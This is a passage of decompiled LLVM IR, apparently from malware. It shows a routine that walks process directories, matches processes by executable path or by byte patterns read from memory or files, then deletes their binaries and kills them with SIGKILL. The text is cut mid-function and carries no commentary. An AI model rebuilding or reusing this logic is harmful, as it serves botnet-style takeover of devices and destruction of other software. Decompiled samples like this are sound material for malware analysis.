  %v1_d1ac = load i32, i32* @r4, align 4
  %v2_d1ac = add i32 %v1_d1ac, %v3_d1a4
  store i32 %v2_d1ac, i32* @r4, align 4
  %v2_d1b4 = inttoptr i32 %v0_d1a8 to i32*
  %v3_d1b4 = call i32 @table_retrieve_val(i32 16, i32* %v2_d1b4)
  store i32 %v3_d1b4, i32* %r1.global-to-local, align 4
  %v0_d1bc = load i32, i32* @r4, align 4
  store i32 %v0_d1bc, i32* @r0, align 4
  %v2_d1c0 = inttoptr i32 %v0_d1bc to i8*
  %v3_d1c0 = call i32 @util_strcpy(i8* %v2_d1c0, i32 %v3_d1b4)
  %v0_d1c4 = load i32, i32* @r5, align 4
  store i32 %v0_d1c4, i32* %r1.global-to-local, align 4
  store i32 %v3_d1c0, i32* @r6, align 4
  %v2_d1d0 = call i32 @__libc_open(i32 %v1_d16c, i32 %v0_d1c4)
  %v7_d1d4 = icmp eq i32 %v2_d1d0, -1
  br i1 %v7_d1d4, label %dec_label_pc_cf80, label %dec_label_pc_d1dc

dec_label_pc_d1dc:                                ; preds = %dec_label_pc_d118
  %v1_d1dc = call i32 @__GI___libc_close(i32 %v2_d1d0)
  %v1_d1e4 = call i32 @table_lock_val(i32 15)
  %v1_d1ec = call i32 @table_lock_val(i32 16)
  store i32 ptrtoint (i32* @global_var_24f14.82 to i32), i32* %r3.global-to-local, align 4
  %v2_d1f8 = load i32, i32* @global_var_24f14.82, align 4
  store i32 %v2_d1f8, i32* %r1.global-to-local, align 4
  store i32 4095, i32* %r2.global-to-local, align 4
  %v3_d204 = call i32 @readlink(i32 %v1_d16c, i32 %v2_d1f8, i32 4095)
  %v7_d208 = icmp eq i32 %v3_d204, -1
  br i1 %v7_d208, label %.thread9, label %bb254

bb254:                                            ; preds = %dec_label_pc_d1dc
  %v3_d210 = load i32, i32* @global_var_24f14.82, align 4
  store i32 %v3_d210, i32* %r3.global-to-local, align 4
  %v1_d214 = load i32, i32* @r5, align 4
  %v2_d214 = trunc i32 %v1_d214 to i8
  %v5_d214 = add i32 %v3_d210, %v3_d204
  %v6_d214 = inttoptr i32 %v5_d214 to i8*
  store i8 %v2_d214, i8* %v6_d214, align 1
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_d1dc, %bb254
  store i32 %v1_d16c, i32* @r0, align 4
  %v0_d21c = load i32, i32* @r6, align 4
  %v1_d21c = load i32, i32* @r4, align 4
  %v1_d16c.neg = sub i32 56, %v2_d154
  %v2_d21c = add i32 %v1_d16c.neg, %v0_d21c
  %v2_d220 = add i32 %v2_d21c, %v1_d21c
  store i32 %v2_d220, i32* @r1, align 4
  %v0_d224 = call i32 @util_zero()
  %v0_d228 = load i32, i32* @r7, align 4
  store i32 %v0_d228, i32* @r4, align 4
  %v0_d22c = load i32, i32* @r5, align 4
  store i32 400, i32* @r5, align 4
  %v2_d334 = ptrtoint i32* %stack_var_-160 to i32
  %v2_d340 = bitcast i32* %stack_var_-160 to i8*
  %v2_d384 = ptrtoint i32* %stack_var_-224 to i32
  %v2_d388 = bitcast i32* %stack_var_-224 to i8*
  %v2_d4f4 = ptrtoint i32* %stack_var_-44 to i32
  %v2_d504 = ptrtoint i32* %stack_var_-48 to i32
  %v2_d518 = ptrtoint i32* %stack_var_-52 to i32
  %v2_d52c = ptrtoint i32* %stack_var_-56 to i32
  %v2_d53c = ptrtoint i32* %stack_var_-64 to i32
  %v2_d544 = ptrtoint i32* %stack_var_-60 to i32
  %v2_d568 = ptrtoint i32* %stack_var_-8416 to i32
  br label %dec_label_pc_d234

dec_label_pc_d234:                                ; preds = %dec_label_pc_d2fc, %.thread9
  %stack_var_-8436.0 = phi i32 [ %v0_d22c, %.thread9 ], [ %stack_var_-8436.3, %dec_label_pc_d2fc ]
  %v1_d238 = call i32 @table_unlock_val(i32 15)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d244 = call i32 @table_retrieve_val(i32 15, i32* null)
  %v1_d248 = call i32 @__GI_opendir(i32 %v3_d244)
  store i32 %v1_d248, i32* @r8, align 4
  %v2_d24c = icmp eq i32 %v1_d248, 0
  br i1 %v2_d24c, label %dec_label_pc_cf80, label %dec_label_pc_d254

dec_label_pc_d254:                                ; preds = %dec_label_pc_d234
  %v1_d258 = call i32 @table_lock_val(i32 15)
  %v0_d25c139 = load i32, i32* @r8, align 4
  %v1_d260140 = inttoptr i32 %v0_d25c139 to i32*
  %v2_d260141 = call i32 @__GI_readdir(i32* %v1_d260140)
  %v2_d264143 = icmp eq i32 %v2_d260141, 0
  br i1 %v2_d264143, label %dec_label_pc_d2fc, label %dec_label_pc_d26c.preheader

dec_label_pc_d26c.preheader:                      ; preds = %dec_label_pc_d254, %dec_label_pc_d25c.backedge
  %v0_d26c155 = phi i32 [ %v2_d260, %dec_label_pc_d25c.backedge ], [ %v2_d260141, %dec_label_pc_d254 ]
  %stack_var_-8436.1144 = phi i32 [ %stack_var_-8436.1.be, %dec_label_pc_d25c.backedge ], [ %stack_var_-8436.0, %dec_label_pc_d254 ]
  br label %dec_label_pc_d26c

dec_label_pc_d26c:                                ; preds = %dec_label_pc_d26c.preheader, %dec_label_pc_d2e4
  %v0_d27c = phi i32 [ %v2_d2f0, %dec_label_pc_d2e4 ], [ %v0_d26c155, %dec_label_pc_d26c.preheader ]
  %stack_var_-8436.2 = phi i32 [ %v1_d290, %dec_label_pc_d2e4 ], [ %stack_var_-8436.1144, %dec_label_pc_d26c.preheader ]
  %v1_d26c = add i32 %v0_d27c, 11
  %v2_d26c = inttoptr i32 %v1_d26c to i8*
  %v3_d26c = load i8, i8* %v2_d26c, align 1
  %v4_d26c = zext i8 %v3_d26c to i32
  %v1_d270 = add nsw i32 %v4_d26c, -48
  store i32 %v1_d270, i32* %r3.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_d270, 9
  br i1 %tmp, label %dec_label_pc_d25c.backedge, label %dec_label_pc_d27c

dec_label_pc_d27c:                                ; preds = %dec_label_pc_d26c
  store i32 %v1_d26c, i32* @r6, align 4
  store i32 %v1_d26c, i32* @r0, align 4
  %v1_d284 = call i32 @atol(i32 %v1_d26c)
  %v0_d28c = load i32, i32* @r5, align 4
  %v1_d290 = add i32 %stack_var_-8436.2, 1
  store i32 %v1_d290, i32* %r1.global-to-local, align 4
  store i32 %v1_d284, i32* @r7, align 4
  %v5_d29c = icmp slt i32 %v0_d28c, %v1_d284
  %v2_d30c = call i32 @__GI_time(i32* null)
  br i1 %v5_d29c, label %dec_label_pc_d308, label %dec_label_pc_d2a0

dec_label_pc_d2a0:                                ; preds = %dec_label_pc_d27c
  %v0_d2a8 = load i32, i32* @r4, align 4
  %v2_d2a8 = sub i32 %v2_d30c, %v0_d2a8
  %v7_d2b0 = icmp slt i32 %v2_d2a8, 601
  br i1 %v7_d2b0, label %dec_label_pc_d2b8, label %.thread10

.thread10:                                        ; preds = %dec_label_pc_d2a0
  store i32 400, i32* @r5, align 4
  br label %dec_label_pc_d25c.backedge

dec_label_pc_d2b8:                                ; preds = %dec_label_pc_d2a0
  %v0_d2b8 = load i32, i32* @r7, align 4
  %v7_d2bc = icmp slt i32 %v0_d2b8, 401
  br i1 %v7_d2bc, label %dec_label_pc_d25c.backedge, label %dec_label_pc_d2c0

dec_label_pc_d2c0:                                ; preds = %dec_label_pc_d2b8
  %v3_d2c8 = zext i32 %v1_d290 to i64
  %v4_d2c8 = mul nuw i64 %v3_d2c8, 3435973837
  %v3_d2cc1 = udiv i64 %v4_d2c8, 34359738368
  %v3_d2d03 = mul nuw nsw i64 %v3_d2cc1, 8
  %v3_d2d0 = trunc i64 %v3_d2d03 to i32
  store i32 %v3_d2d0, i32* %r3.global-to-local, align 4
  %v2_d2d45 = mul nuw nsw i64 %v3_d2cc1, 2
  %v2_d2d4 = trunc i64 %v2_d2d45 to i32
  %v2_d2d8 = add i32 %v3_d2d0, %v2_d2d4
  store i32 %v2_d2d8, i32* %r2.global-to-local, align 4
  %v9_d2dc = icmp eq i32 %v1_d290, %v2_d2d8
  br i1 %v9_d2dc, label %dec_label_pc_d2e4, label %dec_label_pc_d25c.backedge

dec_label_pc_d2e4:                                ; preds = %dec_label_pc_d2c0
  %v1_d2e8 = call i32 @sleep(i32 1)
  %v0_d2ec = load i32, i32* @r8, align 4
  %v1_d2f0 = inttoptr i32 %v0_d2ec to i32*
  %v2_d2f0 = call i32 @__GI_readdir(i32* %v1_d2f0)
  %v2_d2f4 = icmp eq i32 %v2_d2f0, 0
  br i1 %v2_d2f4, label %dec_label_pc_d2fc, label %dec_label_pc_d26c

dec_label_pc_d2fc:                                ; preds = %dec_label_pc_d25c.backedge, %dec_label_pc_d2e4, %dec_label_pc_d254
  %stack_var_-8436.3 = phi i32 [ %stack_var_-8436.0, %dec_label_pc_d254 ], [ %v1_d290, %dec_label_pc_d2e4 ], [ %stack_var_-8436.1.be, %dec_label_pc_d25c.backedge ]
  %v0_d2fc = load i32, i32* @r8, align 4
  %v1_d300 = inttoptr i32 %v0_d2fc to i32*
  %v2_d300 = call i32 @__GI_closedir(i32* %v1_d300)
  br label %dec_label_pc_d234

dec_label_pc_d308:                                ; preds = %dec_label_pc_d27c
  %v1_d318 = call i32 @table_unlock_val(i32 15)
  %v1_d320 = call i32 @table_unlock_val(i32 16)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d32c = call i32 @table_retrieve_val(i32 15, i32* null)
  store i32 %v2_d334, i32* @fp, align 4
  store i32 %v3_d32c, i32* %r1.global-to-local, align 4
  store i32 %v2_d334, i32* @r0, align 4
  %v3_d340 = call i32 @util_strcpy(i8* %v2_d340, i32 %v3_d32c)
  %v1_d344 = load i32, i32* @fp, align 4
  %v2_d344 = add i32 %v1_d344, %v3_d340
  store i32 %v2_d344, i32* %r5.global-to-local, align 4
  %v0_d348 = load i32, i32* @r6, align 4
  store i32 %v0_d348, i32* %r1.global-to-local, align 4
  store i32 %v2_d344, i32* @r0, align 4
  %v2_d350 = inttoptr i32 %v2_d344 to i8*
  %v3_d350 = call i32 @util_strcpy(i8* %v2_d350, i32 %v0_d348)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v3_d350, i32* %r4.global-to-local, align 4
  %v3_d360 = call i32 @table_retrieve_val(i32 16, i32* null)
  store i32 %v3_d360, i32* %r1.global-to-local, align 4
  %v1_d368 = load i32, i32* %r5.global-to-local, align 4
  %v2_d368 = add i32 %v1_d368, %v3_d350
  store i32 %v2_d368, i32* @r0, align 4
  %v2_d36c = inttoptr i32 %v2_d368 to i8*
  %v3_d36c = call i32 @util_strcpy(i8* %v2_d36c, i32 %v3_d360)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d378 = call i32 @table_retrieve_val(i32 15, i32* null)
  store i32 %v3_d378, i32* %r1.global-to-local, align 4
  store i32 %v2_d384, i32* @r0, align 4
  %v3_d388 = call i32 @util_strcpy(i8* %v2_d388, i32 %v3_d378)
  %v2_d394 = add i32 %v3_d388, %v2_d384
  store i32 %v2_d394, i32* @r5, align 4
  store i32 %v2_d394, i32* @r0, align 4
  %v0_d39c = load i32, i32* @r6, align 4
  store i32 %v0_d39c, i32* %r1.global-to-local, align 4
  %v2_d3a0 = inttoptr i32 %v2_d394 to i8*
  %v3_d3a0 = call i32 @util_strcpy(i8* %v2_d3a0, i32 %v0_d39c)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v3_d3a0, i32* @r4, align 4
  %v3_d3b0 = call i32 @table_retrieve_val(i32 34, i32* null)
  store i32 %v3_d3b0, i32* %r1.global-to-local, align 4
  %v0_d3b8 = load i32, i32* @r4, align 4
  %v1_d3b8 = load i32, i32* @r5, align 4
  %v2_d3b8 = add i32 %v1_d3b8, %v0_d3b8
  store i32 %v2_d3b8, i32* @r0, align 4
  %v2_d3bc = inttoptr i32 %v2_d3b8 to i8*
  %v3_d3bc = call i32 @util_strcpy(i8* %v2_d3bc, i32 %v3_d3b0)
  %v1_d3c4 = call i32 @table_lock_val(i32 15)
  %v1_d3cc = call i32 @table_lock_val(i32 16)
  store i32 %v1_d16c, i32* %r1.global-to-local, align 4
  store i32 4095, i32* %r2.global-to-local, align 4
  %v3_d3e0 = call i32 @readlink(i32 %v2_d334, i32 %v1_d16c, i32 4095)
  %v7_d3e4 = icmp eq i32 %v3_d3e0, -1
  store i32 %v3_d3e0, i32* @r5, align 4
  br i1 %v7_d3e4, label %dec_label_pc_d4a8, label %dec_label_pc_d3f0

dec_label_pc_d3f0:                                ; preds = %dec_label_pc_d308
  store i32 %v1_d16c, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v4_d3f8 = add i32 %v3_d3e0, %v1_d16c
  %v5_d3f8 = inttoptr i32 %v4_d3f8 to i8*
  store i8 0, i8* %v5_d3f8, align 1
  %v1_d400 = call i32 @table_unlock_val(i32 35)
  %v0_d404 = load i32, i32* @r4, align 4
  store i32 %v0_d404, i32* %r1.global-to-local, align 4
  %v2_d40c = inttoptr i32 %v0_d404 to i32*
  %v3_d40c = call i32 @table_retrieve_val(i32 35, i32* %v2_d40c)
  %v0_d410 = load i32, i32* @r5, align 4
  %v1_d410 = add i32 %v0_d410, -1
  store i32 %v1_d410, i32* @r1, align 4
  store i32 %v3_d40c, i32* %r2.global-to-local, align 4
  %v4_d41c = call i32 @util_stristr(i8* %v2_d17c, i32 %v1_d410, i32 %v3_d40c)
  %v7_d420 = icmp eq i32 %v4_d41c, -1
  br i1 %v7_d420, label %dec_label_pc_d43c, label %dec_label_pc_d428

dec_label_pc_d428:                                ; preds = %dec_label_pc_d3f0
  %v1_d42c = call i32 @unlink(i32 %v1_d16c)
  %v0_d430 = load i32, i32* @r7, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  %v2_d438 = call i32 @kill(i32 %v0_d430, i32 9)
  br label %dec_label_pc_d43c

dec_label_pc_d43c:                                ; preds = %dec_label_pc_d3f0, %dec_label_pc_d428
  %v1_d440 = call i32 @table_lock_val(i32 35)
  %v1_d444 = call i32 @__getpid(i32 %v1_d440)
  store i32 %v1_d444, i32* @r0, align 4
  %v1_d448 = load i32, i32* @r7, align 4
  %v9_d448 = icmp eq i32 %v1_d444, %v1_d448
  br i1 %v9_d448, label %dec_label_pc_d474, label %dec_label_pc_d450

dec_label_pc_d450:                                ; preds = %dec_label_pc_d43c
  %v0_d450 = call i32 @getppid()
  %v1_d454 = load i32, i32* @r7, align 4
  %v9_d454 = icmp eq i32 %v0_d450, %v1_d454
  br i1 %v9_d454, label %dec_label_pc_d474, label %dec_label_pc_d45c

dec_label_pc_d45c:                                ; preds = %dec_label_pc_d450
  store i32 ptrtoint (i32* @global_var_24f14.82 to i32), i32* %r3.global-to-local, align 4
  %v2_d464 = load i32, i32* @global_var_24f14.82, align 4
  store i32 %v2_d464, i32* %r1.global-to-local, align 4
  %v3_d468 = call i32 @util_strcmp(i8* %v2_d17c, i32 %v2_d464)
  %v2_d46c = icmp eq i32 %v3_d468, 0
  br i1 %v2_d46c, label %dec_label_pc_d480, label %dec_label_pc_d45c.dec_label_pc_d474_crit_edge

dec_label_pc_d45c.dec_label_pc_d474_crit_edge:    ; preds = %dec_label_pc_d45c
  %v0_d478.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_d474

dec_label_pc_d474:                                ; preds = %dec_label_pc_d45c.dec_label_pc_d474_crit_edge, %dec_label_pc_d450, %dec_label_pc_d43c
  %v0_d478 = phi i32 [ %v0_d478.pre, %dec_label_pc_d45c.dec_label_pc_d474_crit_edge ], [ %v0_d450, %dec_label_pc_d450 ], [ %v1_d444, %dec_label_pc_d43c ]
  store i32 %v2_d30c, i32* @r4, align 4
  store i32 %v0_d478, i32* @r5, align 4
  br label %dec_label_pc_d25c.backedge

dec_label_pc_d25c.backedge:                       ; preds = %dec_label_pc_d2c0, %dec_label_pc_d2b8, %dec_label_pc_d26c, %dec_label_pc_d474, %dec_label_pc_d7ac, %.thread10
  %stack_var_-8436.1.be = phi i32 [ %v1_d290, %dec_label_pc_d7ac ], [ %v1_d290, %dec_label_pc_d474 ], [ %v1_d290, %.thread10 ], [ %stack_var_-8436.2, %dec_label_pc_d26c ], [ %v1_d290, %dec_label_pc_d2b8 ], [ %v1_d290, %dec_label_pc_d2c0 ]
  %v0_d25c = load i32, i32* @r8, align 4
  %v1_d260 = inttoptr i32 %v0_d25c to i32*
  %v2_d260 = call i32 @__GI_readdir(i32* %v1_d260)
  %v2_d264 = icmp eq i32 %v2_d260, 0
  br i1 %v2_d264, label %dec_label_pc_d2fc, label %dec_label_pc_d26c.preheader

dec_label_pc_d480:                                ; preds = %dec_label_pc_d45c
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_d488 = call i32 @__libc_open(i32 %v1_d16c, i32 0)
  %v7_d48c = icmp eq i32 %v2_d488, -1
  store i32 %v2_d488, i32* @r4, align 4
  br i1 %v7_d48c, label %bb255, label %.thread12

bb255:                                            ; preds = %dec_label_pc_d480
  store i32 9, i32* @r1, align 4
  br label %.thread12

.thread12:                                        ; preds = %dec_label_pc_d480, %bb255
  store i32 ptrtoint (i32* @global_var_d4a0.85 to i32), i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_d48c, i32 ptrtoint (i32* @global_var_11458.84 to i32))
  %v0_d4a0 = load i32, i32* @r4, align 4
  %v1_d4a4 = call i32 @__GI___libc_close(i32 %v0_d4a0)
  br label %dec_label_pc_d4a8

dec_label_pc_d4a8:                                ; preds = %dec_label_pc_d308, %.thread12
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_d4b0 = call i32 @__libc_open(i32 %v2_d334, i32 0)
  %v7_d4b4 = icmp eq i32 %v2_d4b0, -1
  br i1 %v7_d4b4, label %dec_label_pc_d7ac, label %dec_label_pc_d4c0

dec_label_pc_d4c0:                                ; preds = %dec_label_pc_d4a8
  %v1_d4c4 = call i32 @table_unlock_val(i32 20)
  %v1_d4cc = call i32 @table_unlock_val(i32 21)
  %v1_d4d4 = call i32 @table_unlock_val(i32 22)
  %v1_d4dc = call i32 @table_unlock_val(i32 23)
  %v1_d4e4 = call i32 @table_unlock_val(i32 24)
  %v1_d4ec = call i32 @table_unlock_val(i32 36)
  store i32 %v2_d4f4, i32* %r1.global-to-local, align 4
  %v3_d4fc = call i32 @table_retrieve_val(i32 20, i32* nonnull %stack_var_-44)
  store i32 %v2_d504, i32* %r1.global-to-local, align 4
  store i32 %v3_d4fc, i32* @r6, align 4
  %v3_d510 = call i32 @table_retrieve_val(i32 21, i32* nonnull %stack_var_-48)
  store i32 %v2_d518, i32* %r1.global-to-local, align 4
  store i32 %v3_d510, i32* @sl, align 4
  %v3_d524 = call i32 @table_retrieve_val(i32 22, i32* nonnull %stack_var_-52)
  store i32 %v2_d52c, i32* %r1.global-to-local, align 4
  store i32 %v3_d524, i32* @sb, align 4
  %v3_d538 = call i32 @table_retrieve_val(i32 23, i32* nonnull %stack_var_-56)
  store i32 %v2_d544, i32* %r1.global-to-local, align 4
  %v3_d54c = call i32 @table_retrieve_val(i32 24, i32* nonnull %stack_var_-60)
  store i32 %v2_d53c, i32* %r1.global-to-local, align 4
  %v3_d55c = call i32 @table_retrieve_val(i32 36, i32* nonnull %stack_var_-64)
  store i32 %v2_d568, i32* @r4, align 4
  store i32 %v2_d568, i32* @r1, align 4
  store i32 4096, i32* @r2, align 4
  %v1_d578136 = call i32 @__libc_read(i32 %v2_d4b0)
  %tmp256 = icmp slt i32 %v1_d578136, 1
  br i1 %tmp256, label %dec_label_pc_d7dc, label %dec_label_pc_d584

dec_label_pc_d584:                                ; preds = %dec_label_pc_d4c0, %dec_label_pc_d56c.backedge
  %v0_d628127 = phi i32 [ %v1_d578, %dec_label_pc_d56c.backedge ], [ %v1_d578136, %dec_label_pc_d4c0 ]
  %v3_d588 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d588, i32* @r5, align 4
  %v5_d590 = icmp slt i32 %v0_d628127, %v3_d588
  br i1 %v5_d590, label %dec_label_pc_d5a0, label %dec_label_pc_d668.lr.ph

dec_label_pc_d668.lr.ph:                          ; preds = %dec_label_pc_d584
  %v1_d66083 = add i32 %v0_d628127, -1
  store i32 %v1_d66083, i32* %r1.global-to-local, align 4
  %v0_d668.pre = load i32, i32* @r6, align 4
  %v1_d66c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d668

dec_label_pc_d5a0:                                ; preds = %dec_label_pc_d660.backedge, %dec_label_pc_d584
  store i32 %v2_cf90, i32* %r1.global-to-local, align 4
  %v3_d5a4 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_d5a4, i32* @r5, align 4
  %v5_d5ac = icmp slt i32 %v0_d628127, %v3_d5a4
  br i1 %v5_d5ac, label %dec_label_pc_d5bc, label %.thread28

.thread28:                                        ; preds = %dec_label_pc_d5a0
  %v1_d69492 = add i32 %v0_d628127, -1
  store i32 %v1_d69492, i32* %r1.global-to-local, align 4
  %v2_d69493 = icmp eq i32 %v0_d628127, 0
  br i1 %v2_d69493, label %dec_label_pc_d5bc, label %dec_label_pc_d69c.lr.ph

dec_label_pc_d69c.lr.ph:                          ; preds = %.thread28
  %v0_d69c.pre = load i32, i32* @sl, align 4
  %v1_d6a0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d69c

dec_label_pc_d5bc:                                ; preds = %dec_label_pc_d694.backedge, %.thread28, %dec_label_pc_d5a0
  store i32 %v2_cf90, i32* %r2.global-to-local, align 4
  %v3_d5c0 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_d5c0, i32* @r5, align 4
  %v5_d5c8 = icmp slt i32 %v0_d628127, %v3_d5c0
  br i1 %v5_d5c8, label %dec_label_pc_d5d8, label %.thread37

.thread37:                                        ; preds = %dec_label_pc_d5bc
  %v1_d6c8101 = add i32 %v0_d628127, -1
  store i32 %v1_d6c8101, i32* %r1.global-to-local, align 4
  %v2_d6c8102 = icmp eq i32 %v0_d628127, 0
  br i1 %v2_d6c8102, label %dec_label_pc_d5d8, label %dec_label_pc_d6d0.lr.ph

dec_label_pc_d6d0.lr.ph:                          ; preds = %.thread37
  %v0_d6d0.pre = load i32, i32* @sb, align 4
  %v1_d6d4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d6d0

dec_label_pc_d5d8:                                ; preds = %dec_label_pc_d6c8.backedge, %.thread37, %dec_label_pc_d5bc
  store i32 %v2_cf90, i32* @r3, align 4
  %v3_d5dc = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_d5dc, i32* @r5, align 4
  %v5_d5e4 = icmp slt i32 %v0_d628127, %v3_d5dc
  br i1 %v5_d5e4, label %dec_label_pc_d5f4, label %.thread46

.thread46:                                        ; preds = %dec_label_pc_d5d8
  %v1_d6fc110 = add i32 %v0_d628127, -1
  store i32 %v1_d6fc110, i32* %r1.global-to-local, align 4
  %v2_d6fc111 = icmp eq i32 %v0_d628127, 0
  br i1 %v2_d6fc111, label %dec_label_pc_d5f4, label %dec_label_pc_d704.lr.ph

dec_label_pc_d704.lr.ph:                          ; preds = %.thread46
  %v1_d70c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d704

dec_label_pc_d5f4:                                ; preds = %dec_label_pc_d6fc.backedge, %.thread46, %dec_label_pc_d5d8
  %v3_d5f8 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_d5f8, i32* @r5, align 4
  %v5_d600 = icmp slt i32 %v0_d628127, %v3_d5f8
  br i1 %v5_d600, label %dec_label_pc_d610, label %.thread55

.thread55:                                        ; preds = %dec_label_pc_d5f4
  %v1_d734119 = add i32 %v0_d628127, -1
  store i32 %v1_d734119, i32* %r1.global-to-local, align 4
  %v2_d734120 = icmp eq i32 %v0_d628127, 0
  br i1 %v2_d734120, label %dec_label_pc_d610, label %dec_label_pc_d73c.lr.ph

dec_label_pc_d73c.lr.ph:                          ; preds = %.thread55
  %v1_d744.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d73c

dec_label_pc_d610:                                ; preds = %dec_label_pc_d734.backedge, %.thread55, %dec_label_pc_d5f4
  %v3_d614 = load i32, i32* %stack_var_-64, align 4
  store i32 %v3_d614, i32* @lr, align 4
  %v5_d61c = icmp slt i32 %v0_d628127, %v3_d614
  br i1 %v5_d61c, label %dec_label_pc_d56c.backedge, label %.thread61

dec_label_pc_d56c.backedge:                       ; preds = %dec_label_pc_d648, %.thread61, %dec_label_pc_d610
  store i32 %v2_d568, i32* @r1, align 4
  store i32 4096, i32* @r2, align 4
  %v1_d578 = call i32 @__libc_read(i32 %v2_d4b0)
  %tmp257 = icmp slt i32 %v1_d578, 1
  br i1 %tmp257, label %dec_label_pc_d7dc, label %dec_label_pc_d584

.thread61:                                        ; preds = %dec_label_pc_d610
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_d628129 = icmp eq i32 %v0_d628127, 0
  br i1 %v2_d628129, label %dec_label_pc_d56c.backedge, label %dec_label_pc_d630.lr.ph

dec_label_pc_d630.lr.ph:                          ; preds = %.thread61
  %v1_d638.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d630

dec_label_pc_d630:                                ; preds = %dec_label_pc_d648, %dec_label_pc_d630.lr.ph
  %v0_d628.in = phi i32 [ %v0_d628127, %dec_label_pc_d630.lr.ph ], [ %v0_d628, %dec_label_pc_d648 ]
  %v0_d648 = phi i32 [ 0, %dec_label_pc_d630.lr.ph ], [ %v1_d648, %dec_label_pc_d648 ]
  %v1_d634 = phi i32 [ 0, %dec_label_pc_d630.lr.ph ], [ %v1_d634202, %dec_label_pc_d648 ]
  %v0_d628 = add i32 %v0_d628.in, -1
  store i32 %v3_d55c, i32* %r3.global-to-local, align 4
  %v2_d634 = add i32 %v1_d634, %v3_d55c
  %v3_d634 = inttoptr i32 %v2_d634 to i8*
  %v4_d634 = load i8, i8* %v3_d634, align 1
  %v6_d634 = zext i8 %v4_d634 to i32
  store i32 %v6_d634, i32* %r2.global-to-local, align 4
  %v2_d638 = add i32 %v0_d648, %v1_d638.pre
  %v3_d638 = inttoptr i32 %v2_d638 to i8*
  %v4_d638 = load i8, i8* %v3_d638, align 1
  %v6_d638 = zext i8 %v4_d638 to i32
  store i32 %v6_d638, i32* @r3, align 4
  %v9_d63c = icmp eq i8 %v4_d638, %v4_d634
  br i1 %v9_d63c, label %dec_label_pc_d75c, label %bb258

bb258:                                            ; preds = %dec_label_pc_d630
  br label %dec_label_pc_d648

dec_label_pc_d648:                                ; preds = %bb258, %dec_label_pc_d75c
  %v1_d634202 = phi i32 [ %v1_d75c, %dec_label_pc_d75c ], [ 0, %bb258 ]
  %v1_d648 = add i32 %v0_d648, 1
  store i32 %v1_d648, i32* %r1.global-to-local, align 4
  %v2_d628 = icmp eq i32 %v0_d628, 0
  br i1 %v2_d628, label %dec_label_pc_d56c.backedge, label %dec_label_pc_d630

dec_label_pc_d650:                                ; preds = %dec_label_pc_d668
  %v1_d650 = add i32 %v1_d668, 1
  store i32 %v1_d650, i32* @lr, align 4
  %v9_d654 = icmp eq i32 %v3_d588, %v1_d650
  br i1 %v9_d654, label %dec_label_pc_d768, label %dec_label_pc_d660.backedge

dec_label_pc_d660.backedge:                       ; preds = %dec_label_pc_d650, %dec_label_pc_d67c
  %v1_d668160 = phi i32 [ 0, %dec_label_pc_d67c ], [ %v1_d650, %dec_label_pc_d650 ]
  %storemerge148 = add i32 %storemerge148.in, 1
  %v1_d660 = add i32 %v0_d660, -1
  store i32 %v1_d660, i32* %r1.global-to-local, align 4
  %v2_d660 = icmp eq i32 %v0_d660, 0
  br i1 %v2_d660, label %dec_label_pc_d5a0, label %dec_label_pc_d668

dec_label_pc_d668:                                ; preds = %dec_label_pc_d660.backedge, %dec_label_pc_d668.lr.ph
  %v0_d660 = phi i32 [ %v1_d66083, %dec_label_pc_d668.lr.ph ], [ %v1_d660, %dec_label_pc_d660.backedge ]
  %storemerge148.in = phi i32 [ 0, %dec_label_pc_d668.lr.ph ], [ %storemerge148, %dec_label_pc_d660.backedge ]
  %v1_d668 = phi i32 [ 0, %dec_label_pc_d668.lr.ph ], [ %v1_d668160, %dec_label_pc_d660.backedge ]
  %v2_d668 = add i32 %v1_d668, %v0_d668.pre
  %v3_d668 = inttoptr i32 %v2_d668 to i8*
  %v4_d668 = load i8, i8* %v3_d668, align 1
  %v6_d668 = zext i8 %v4_d668 to i32
  store i32 %v6_d668, i32* %r2.global-to-local, align 4
  %v2_d66c = add i32 %storemerge148.in, %v1_d66c.pre
  %v3_d66c = inttoptr i32 %v2_d66c to i8*
  %v4_d66c = load i8, i8* %v3_d66c, align 1
  %v6_d66c = zext i8 %v4_d66c to i32
  store i32 %v6_d66c, i32* %r3.global-to-local, align 4
  %v9_d670 = icmp eq i8 %v4_d66c, %v4_d668
  br i1 %v9_d670, label %dec_label_pc_d650, label %dec_label_pc_d67c

dec_label_pc_d67c:                                ; preds = %dec_label_pc_d668
  br label %dec_label_pc_d660.backedge

dec_label_pc_d684:                                ; preds = %dec_label_pc_d69c
  %v1_d684 = add i32 %v1_d69c, 1
  store i32 %v1_d684, i32* @lr, align 4
  %v9_d688 = icmp eq i32 %v3_d5a4, %v1_d684
  br i1 %v9_d688, label %dec_label_pc_d768, label %dec_label_pc_d694.backedge

dec_label_pc_d694.backedge:                       ; preds = %dec_label_pc_d684, %dec_label_pc_d6b0
  %v1_d69c169 = phi i32 [ 0, %dec_label_pc_d6b0 ], [ %v1_d684, %dec_label_pc_d684 ]
  %storemerge147 = add i32 %storemerge147.in, 1
  %v1_d694 = add i32 %v0_d694, -1
  store i32 %v1_d694, i32* %r1.global-to-local, align 4
  %v2_d694 = icmp eq i32 %v0_d694, 0
  br i1 %v2_d694, label %dec_label_pc_d5bc, label %dec_label_pc_d69c

